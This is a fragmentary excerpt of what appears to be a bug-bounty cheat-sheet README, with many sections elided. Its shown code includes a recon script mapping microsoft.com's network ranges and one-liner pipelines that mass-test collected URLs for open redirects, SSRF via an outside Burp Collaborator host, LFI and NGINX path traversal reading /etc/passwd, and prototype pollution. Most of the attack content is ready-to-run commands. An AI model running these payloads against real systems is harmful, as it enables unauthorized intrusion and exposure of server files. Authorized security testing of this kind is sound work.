...
>     - [↳ Subdomain Enum Tools](#subdomain-enum-tools)
>     - [↳ Domain Enum Service](#domain-enum-service)
>     - [↳ Domain Bruteforce](#domain-bruteforce)
>   - [↳ Uncover](#uncover)
>   - [↳ Censys](#censys)
>   - [↳ Information Gathering (Passive and Active Using Nmap)](#information-gathering-passive-and-active-using-nmap)
>   - [↳ JavaScript](#javascript)
>   - [↳ SSL C](#ssl-c)
>   - [↳ URL And Endpoint Discovery](#url-and-endpoint-discovery)
>   - [↳ DNS](#dns)
>   - [↳ Port Scanning](#port-scanning)
>   - [↳ URL Sorting](#url-sorting)
> - [Test](#test)
>   - [↳ Automated Famework](#automated-famework)
>     - [↳ Nuclei](#nuclei)
>     - [↳ Jaeles](#jaeles)
>     - [↳ Xray](#xray)
>   - [↳ Fuzzing](#fuzzing)
...
>     - [↳ Local File Inclusion(LFI) & Path Traversal](#local-file-inclusionlfi--path-traversal)
>     - [↳ SQLi Injection](#sqli-injection)
>     - [↳ Server Side Template Injection ( SSTI )](#server-side-template-injection-ssti)
>     - [↳ Info Discloser](#info-discloser)
...
<a id="target-collection"></a>

<details>
<summary>&nbsp;&nbsp;&nbsp;&nbsp;↳ Target Collection</summary>

<a id="bounty-targets-data"></a>

<details>
<summary>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;↳ bounty-targets-data</summary>
...
<a id="domain-enumeration"></a>

<details>
<summary>&nbsp;&nbsp;&nbsp;&nbsp;↳ <b>Domain Enumeration</b></summary>

---

<a id="subdomain-enum-tools"></a>

<details>
<summary>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;↳ <b>Subdomain Enum Tools</b></summary>
...
```
```bash
# Get favicon hash witFh 'favicon-hash.kmsec.uk' api
...
<a id="domain-enum-service"></a>

<details>
<summary>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;↳ <b>Domain Enum Service</b></summary>
...
<a id="domain-bruteforce"></a>

<details>
<summary>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;↳ Domain Bruteforce</summary>
...
<a id="information-gathering-passive-and-active-using-nmap"></a>

<details>
<summary>&nbsp;&nbsp;&nbsp;&nbsp;↳ Information Gathering (Passive and Active Using Nmap)</summary>

```bash
# Collect CIDR using ASN
domain="microsoft.com"

ip=$(dig +short A "$domain" | grep -E '^[0-9.]+$' | head -1)

asn=$(whois -h whois.cymru.com " -v $ip" \
| awk 'NR==2{print "AS"$1}')
...
while read -r DOMAIN; do
  ...
  | while read -r ip; do
      echo "[+] $DOMAIN -> $ip"
      whois "$ip" | awk -F: '
        /^(CIDR|NetRange|Organization|OrgName):/ {
          gsub(/^[ \t]+/, "", $2)
          print $1 ": " $2
        }
      '
...
---
<a id="url-and-endpoint-discovery"></a>

<details>
<summary>&nbsp;&nbsp;&nbsp;&nbsp;↳ <b>URL And Endpoint Discovery</b></summary>
...
<details>
<summary>&nbsp;&nbsp;&nbsp;&nbsp;↳ <b>Port Scanning</b></summary>
...
<details>
<summary>&nbsp;&nbsp;&nbsp;&nbsp;↳ <b>URL Sorting</b></summary>
...
<a id="automated-famework"></a>

<details>
<summary>&nbsp;&nbsp;&nbsp;&nbsp;↳ <b>Automated Famework</b></summary>
...
<details>
<summary>&nbsp;&nbsp;&nbsp;&nbsp;↳ <b>Fuzzing</b></summary>

<a id="open-redirect"></a>

<details>
<summary>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;↳ <b>Open Redirect</b></summary>
...
subfinder -dL domains.txt -all -silent | httprobe | tee live_domain.txt; cat live_domain.txt | waybackurls | tee wayback.txt; cat wayback.txt | sort -u | grep "\?" > open.txt; nuclei -t http/vulnerabilities/generic/open-redirect-generic.yaml,dast/vulnerabilities/redirect/open-redirect-bypass.yaml,dast/vulnerabilities/redirect/open-redirect.yaml -l open.txt
``` 
```bash
...
<a id="server-side-request-forgeryssrf"></a>
...
cat subdomains.txt | dnsx | gau | grep "=" | qsreplace http://hacker.burpcollaborator.net | httpx -silent -fr 
```
```bash
# Recon to search SSRF Test
cat urls.txt | grep "=" | qsreplace "burpcollaborator_link" | httpx -silent -fr 
```
</details>

---

<a id="cross-site-scripting-xss"></a>
...
<a id="local-file-inclusionlfi-and-path-traversal"></a>

<details>
<summary>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;↳ <b>Local File Inclusion(LFI) & Path Traversal</b></summary>
...
cat subdomains.txt | httpx -nc -t 250 -p 80,443,8080,8443,4443,8888 -path "/api/geojson?url=file:///etc/passwd" -mr "root:x"
```
```bash
# Local file inclusion
cat targets.txt | (gau || hakrawler || waybackurls || katana) |  grep "=" |  dedupe | httpx -silent -paths lfi_wordlist.txt -threads 100 -random-agent -x GET,POST -sc -fr -mc 200 -mr "root:[x*]:0:0:"
```
```bash
...
```bash
# NGINX Path Traversal
httpx -l url.txt -path "///////../../../../../../etc/passwd" -sc -mc 200 -ms 'root:'
```
</details>

---

<a id="sqli-injection"></a>

<details>
<summary>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;↳ <b>SQLi Injection</b></summary>
...
<a id="server-side-template-injection-ssti"></a>

<details>
<summary>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;↳ <b>Server Side Template Injection ( SSTI )</b></summary>
...
<a id="info-discloser"></a>

<details>
<summary>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;↳ <b>Info Discloser</b></summary>
...
<details>
<summary>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;↳ <b>403 Bypass</b></summary>
...
<a id="prototype-pollution"></a>

<details>
<summary>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;↳ <b>Prototype Pollution</b></summary>

```bash
echo "https://target.com" | nuclei -t vulnerabilities/proto-pollution/
```
```bash
cat targets.txt | ppfuzz -c 50 -xss
```
```bash
# Prototype Pollution
...
<a id="cross-origin-resource-sharing-cors"></a>
...
<details>
<summary>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;↳ <b>Dependency Confusion</b></summary>
...
<details>
<summary><b>Miscellaneous Utilities</b></summary>
